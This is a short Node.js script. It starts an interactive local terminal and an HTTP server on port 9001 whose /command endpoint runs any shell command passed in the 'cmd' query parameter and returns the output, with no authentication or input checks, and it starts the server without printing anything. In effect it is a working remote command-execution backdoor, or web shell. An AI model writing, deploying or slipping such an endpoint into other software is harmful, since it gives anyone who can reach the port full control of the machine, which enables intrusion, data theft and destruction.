const http = require("http");
const url = require("url");
const { exec } = require("child_process");
const readline = require("readline");

// ---------------- Terminal Interface ----------------

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function ask() {
    rl.question("> ", (input) => {
        exec(input, (err, stdout, stderr) => {
            if (err) {
                console.log("Error:", err.message);
            }
            if (stdout) {
                console.log(stdout);
            }
            if (stderr) {
                console.log(stderr);
            }
            ask();
        });
    });
}

console.log("Interactive terminal started. Type your commands:");
ask();

// ---------------- HTTP Server ----------------

const server = http.createServer((req, res) => {
    const parsed = url.parse(req.url, true);

    if (parsed.pathname === "/command") {
        const cmd = parsed.query.cmd;

        if (!cmd) {
            res.writeHead(400, { "Content-Type": "text/plain" });
            res.end("No cmd provided");
            return;
        }

        exec(cmd, (err, stdout, stderr) => {
            res.writeHead(200, { "Content-Type": "text/plain" });
            if (err) {
                res.end("Error: " + err.message);
                return;
            }
            res.end(stdout || stderr || "");
        });

    } else {
        res.writeHead(404, { "Content-Type": "text/plain" });
        res.end("Not Found");
    }
});

server.listen(9001, () => {
});
